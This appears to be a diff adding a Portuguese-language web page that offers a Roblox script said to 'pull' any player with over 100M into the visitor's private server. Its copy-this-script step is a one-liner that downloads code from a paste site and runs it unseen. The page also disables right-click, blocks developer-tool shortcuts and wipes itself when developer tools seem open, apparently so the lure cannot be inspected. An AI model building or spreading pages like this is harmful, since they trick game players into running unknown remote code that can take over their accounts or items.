@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Script +100M</title>
+
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap');
+
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: 'Poppins', sans-serif;
+  user-select: none;
+}
+
+/* BLOQUEIA SCROLL TOTAL */
+html, body {
+  height: 100%;
+  overflow: hidden;
+  touch-action: none;
+}
+
+body {
+  background: radial-gradient(circle at top, #1f1f1f, #0a0a0a);
+  color: #fff;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+/* CONTAINER */
+.container {
+  max-width: 420px;
+  width: 100%;
+  background: rgba(20, 20, 20, 0.95);
+  border-radius: 22px;
+  padding: 25px;
+  text-align: center;
+  box-shadow: 0 0 45px rgba(0, 140, 255, 0.35);
+}
+
+/* GIF COM GLOW */
+.gif {
+  width: 100%;
+  border-radius: 18px;
+  margin-bottom: 18px;
+  animation: glowPulse 2.5s infinite ease-in-out;
+}
+
+@keyframes glowPulse {
+  0% {
+    box-shadow: 0 0 10px rgba(0,140,255,0.4),
+                0 0 20px rgba(0,140,255,0.3);
+  }
+  50% {
+    box-shadow: 0 0 25px rgba(0,198,255,0.8),
+                0 0 45px rgba(0,198,255,0.6);
+  }
+  100% {
+    box-shadow: 0 0 10px rgba(0,140,255,0.4),
+                0 0 20px rgba(0,140,255,0.3);
+  }
+}
+
+h1 {
+  font-size: 22px;
+  font-weight: 700;
+  margin-bottom: 8px;
+}
+
+p {
+  font-size: 14px;
+  opacity: 0.85;
+  margin-bottom: 18px;
+}
+
+/* SCRIPT BOX */
+.script-box {
+  background: #0c0c0c;
+  border: 1px solid #1e90ff;
+  border-radius: 12px;
+  padding: 12px;
+  font-size: 12px;
+  word-break: break-all;
+  margin-bottom: 14px;
+}
+
+/* BOTÃO */
+button {
+  width: 100%;
+  padding: 14px;
+  font-size: 16px;
+  font-weight: 600;
+  border: none;
+  border-radius: 16px;
+  cursor: pointer;
+  background: linear-gradient(135deg, #1e90ff, #00c6ff);
+  color: #fff;
+  transition: transform 0.2s, box-shadow 0.2s;
+}
+
+button:hover {
+  transform: scale(1.06);
+  box-shadow: 0 0 25px rgba(0, 198, 255, 0.8);
+}
+
+.status {
+  margin-top: 10px;
+  font-size: 13px;
+  color: #00ffae;
+  display: none;
+}
+
+/* REDES SOCIAIS */
+.socials {
+  margin-top: 22px;
+  display: flex;
+  justify-content: center;
+  gap: 18px;
+}
+
+.socials img {
+  width: 50px;
+  height: 50px;
+  border-radius: 16px;
+  object-fit: cover;
+  transition: transform 0.2s, box-shadow 0.2s;
+  box-shadow: 0 0 12px rgba(0,0,0,0.6);
+}
+
+.socials img:hover {
+  transform: scale(1.15);
+  box-shadow: 0 0 22px rgba(0, 198, 255, 0.7);
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <img class="gif" src="https://i.postimg.cc/13Zzc3wG/standard-(1).gif">
+
+  <h1>🔥 Puxe players com +100M</h1>
+  <p>Use este script para puxar qualquer player direto para o seu servidor privado.</p>
+
+  <div class="script-box" id="script">
+loadstring(game:HttpGet("https://pastefy.app/v074mA6P/raw"))()
+  </div>
+
+  <button onclick="copiarScript()">📋 Copiar Script</button>
+  <div class="status" id="status">✅ Script copiado com sucesso!</div>
+
+  <div class="socials">
+    <a href="https://discord.gg/" target="_blank">
+      <img src="https://i.postimg.cc/d11hQxBj/images-(1).png">
+    </a>
+    <a href="https://www.tiktok.com/" target="_blank">
+      <img src="https://i.postimg.cc/vH666CdX/unnamed.webp">
+    </a>
+  </div>
+
+</div>
+
+<script>
+/* COPIAR SCRIPT */
+function copiarScript() {
+  const texto = document.getElementById("script").innerText;
+  const textarea = document.createElement("textarea");
+  textarea.value = texto;
+  textarea.style.position = "fixed";
+  textarea.style.opacity = "0";
+  document.body.appendChild(textarea);
+  textarea.select();
+  document.execCommand("copy");
+  document.body.removeChild(textarea);
+
+  const status = document.getElementById("status");
+  status.style.display = "block";
+  setTimeout(() => status.style.display = "none", 2000);
+}
+
+/* ANTI INSPECIONAR (BÁSICO) */
+document.addEventListener("contextmenu", e => e.preventDefault());
+
+document.addEventListener("keydown", e => {
+  if (
+    e.key === "F12" ||
+    (e.ctrlKey && e.shiftKey && ["I","J","C"].includes(e.key)) ||
+    (e.ctrlKey && e.key === "U")
+  ) {
+    e.preventDefault();
+  }
+});
+
+/* DETECTA DEVTOOLS ABERTO */
+setInterval(() => {
+  const widthDiff = window.outerWidth - window.innerWidth;
+  const heightDiff = window.outerHeight - window.innerHeight;
+  if (widthDiff > 160 || heightDiff > 160) {
+    document.body.innerHTML = "<h1 style='color:white;text-align:center;margin-top:40vh'>⚠️ Acesso bloqueado</h1>";
+  }
+}, 1000);
+</script>
+
+</body>
+</html>
